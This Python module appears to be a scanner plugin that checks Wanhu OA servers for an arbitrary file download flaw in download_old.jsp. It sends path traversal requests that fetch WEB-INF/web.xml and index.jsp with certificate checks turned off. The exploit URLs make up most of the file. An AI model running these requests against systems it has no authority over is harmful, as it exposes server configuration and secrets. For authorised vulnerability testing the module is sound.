import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 万户OA_download_old(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    exp_url1 = urldata + "defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml"
    exp_url2 = urldata + 'defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp'
    vuln = urldata + 'defaultroot/download_old.jsp?path=..&name=x&FileName='
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(exp_url1, headers=headers, verify=False)
        respones2 = requests.get(exp_url2, headers=headers, verify=False)

        if respones1.status_code == 200:
            print(Vcolors.RED + "[+] 万户OA downloadold.jsp 任意文件下载漏洞存在{}".format(exp_url1) +Vcolors.ENDC)
        if respones2.status_code == 200:
            print(Vcolors.RED + "[+] 万户OA downloadold.jsp 任意文件下载漏洞存在{}".format(exp_url2) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 万户OA downloadold.jsp 任意文件下载漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("万户OA_download_old脚本出现异常")

